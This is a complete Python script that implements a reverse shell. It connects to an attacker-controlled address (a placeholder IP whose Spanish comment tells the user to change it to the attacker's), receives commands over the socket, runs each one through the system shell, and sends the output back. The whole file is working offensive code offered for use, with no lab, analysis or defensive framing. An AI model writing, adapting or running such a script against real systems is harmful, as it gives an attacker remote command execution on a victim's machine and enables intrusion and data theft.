#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
            
        output = subprocess.check_output(command, shell=True)
        s.send(output)
    
    s.close()

if __name__ == '__main__':
    HOST = '10.10.10.10'  # Cambia esto por la IP del atacante
    PORT = 1234           # Cambia esto por el puerto deseado
    reverse_shell(HOST, PORT) 